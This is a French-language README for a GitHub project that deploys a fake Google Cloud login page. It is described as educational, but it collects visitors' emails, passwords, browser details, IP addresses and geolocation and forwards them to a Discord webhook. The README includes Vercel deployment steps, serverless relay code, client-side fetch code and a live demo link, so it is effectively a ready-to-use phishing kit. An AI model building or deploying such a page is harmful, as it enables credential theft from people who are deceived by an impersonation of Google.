# 🌐 GCloud Connexion – Démo Éducative

Ce projet est une **fausse page de connexion GCloud** à but **strictement pédagogique**. Il sert à montrer comment collecter certaines données côté client (navigateur, IP, géo) et les envoyer à un webhook Discord.

> ⚠️ Ce projet ne fait aucune vraie authentification. Il est à **usage éducatif uniquement**.

---

## ✨ Fonctionnalités

- Interface UI inspirée de Google
- Collecte côté client :
  - Email et mot de passe (fictifs)
  - Infos navigateur (agent, langue, fuseau, résolution…)
  - IP et géolocalisation approximative via [ipapi.co](https://ipapi.co/json)
- Envoi des données dans un **webhook Discord** sécurisé via variable d’environnement
- Déploiement automatique avec [Vercel](https://vercel.com)

---

## 🛠️ Tech Stack

- HTML / CSS / JS pur
- API Web natives (`fetch`, `navigator`, etc.)
- [ipapi.co](https://ipapi.co/json) pour l’IP et géolocalisation
- Hébergement via [Vercel](https://vercel.com)

---

## 🚀 Déploiement (Vercel)

### 1. Cloner le repo

```bash
git clone https://github.com/PariaHRZ/gcloud-login
cd gcloud-login
```

### 2. Déployer avec Vercel

1. Va sur [vercel.com](https://vercel.com)
2. Connecte ton compte GitHub
3. Clique sur **"Add New → Project"**
4. Sélectionne le repo
5. Va dans l’onglet **Environment Variables** et ajoute :

| Nom de la variable      | Valeur (exemple)                        |
|-------------------------|-----------------------------------------|
| `DISCORD_WEBHOOK_URL`   | `https://discord.com/api/webhooks/...` |

6. Lance le déploiement ✅

Ton site sera accessible à une URL comme :
```
https://ton-projet.vercel.app
```

---

## 📦 Lancer en local

```bash
git clone https://github.com/PariaHRZ/gcloud-login
cd gcloud-login
open index.html  # ou double-clique dessus
```

⚠️ En local, le webhook Discord **ne fonctionnera pas** sans backend intermédiaire.

---

## 🔒 Sécurité du webhook

Le webhook Discord est **stocké dans une variable d’environnement** (`DISCORD_WEBHOOK_URL`) sur Vercel, et **jamais exposé dans le code HTML/JS**.

L’envoi se fait vers une API Vercel (serverless function) sécurisée.

---

## 📁 Exemple d’API (à mettre dans `/api/webhook.js`)

```js
export default async function handler(req, res) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) return res.status(500).send("Webhook manquant");

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(req.body),
  });

  res.status(200).send("OK");
}
```

Et côté client dans ton JS :

```js
fetch("/api/webhook", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ content: message })
});
```

---

## 📄 Licence

MIT – libre d’adaptation à des fins pédagogiques.

---

## 🔗 Démo

🔗 [https://gcloud-login-git-main-pariahrzs-projects.vercel.app/](https://gcloud-login-git-main-pariahrzs-projects.vercel.app/)
